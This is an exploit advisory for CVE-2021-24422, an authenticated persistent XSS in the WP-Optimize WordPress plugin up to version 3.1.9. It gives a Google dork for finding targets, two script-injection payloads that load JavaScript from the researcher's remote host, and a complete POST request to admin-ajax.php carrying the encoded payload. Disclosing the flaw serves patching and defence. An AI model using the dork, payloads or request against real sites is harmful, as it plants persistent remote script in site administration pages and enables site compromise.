/*!
- # VULNERABILITY: WP-Optimize WordPress Plugin <= 3.1.9 - Authenticated Persistent XSS
- # GOOGLE DORK: inurl:/wp-content/plugins/wp-optimize/
- # DATE: 2021-05-08
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Team Updraft [ https://updraftplus.com ]
- # SOFTWARE VERSION: <= 3.1.9
- # SOFTWARE LINK: https://wordpress.org/plugins/wp-optimize/
- # CVSS: 3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N
- # CWE: CWE-79
- # CVE: CVE-2021-24422
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS vulnerability was discovered in the WP-Optimize plugin through v3.1.9 for WordPress.

[i] Vulnerable parameter(s): wpo-logger-options[<?php echo $option_name; ?>][].



### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] m0ze</textarea><script src=//m0ze.ru/payload/a.js></script>

[$] m0ze<script src=//m0ze.ru/payload/a.js></script><div x



### -- [ PoC | Authenticated Persistent XSS | Settings > Logging settings > Store the most recent log entries in the WordPress database: ]

[!] POST /wp-admin/admin-ajax.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 980

action=wp_optimize_ajax&subaction=save_settings&nonce=cf0f4a8813&data=retention-period%3D2%26schedule_type%3Dwpo_weekly%26wp-optimize-auto%255Brevisions%255D%3Dtrue%26wp-optimize-auto%255Bdrafts%255D%3Dtrue%26wp-optimize-auto%255Btrash%255D%3Dtrue%26wp-optimize-auto%255Bspams%255D%3Dtrue%26_wpnonce_db_settings%3D8f94a32d83%26_wp_http_referer%3D%252Fwp-admin%252Fadmin.php%253Fpage%253Dwpo_settings%26enable_cache_in_admin_bar%3D1%26wpo-logger-type%255B%255D%3Dupdraft_ring_logger%26wpo-logger-options%255Bring_logger_limit%255D%255B%255D%3Dm0ze%253Cscript%2520src%253D%252F%252Fm0ze.ru%252Fpayload%252Fa.js%253E%253C%252Fscript%253E%253Cdiv%2520x%26wpo-logger-options%255Bactive%255D%255B%255D%3D1%26_wpnonce%3D8f94a32d83%26_wp_http_referer%3D%252Fwp-admin%252Fadmin.php%253Fpage%253Dwpo_settings%26enable-retention%3D0%26enable-schedule%3D0%26wp-optimize-auto%5Boptimize%5D%3D0%26wp-optimize-auto%5Bunapproved%5D%3D0%26wp-optimize-auto%5Btransient%5D%3D0%26enable-admin-bar%3D0



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
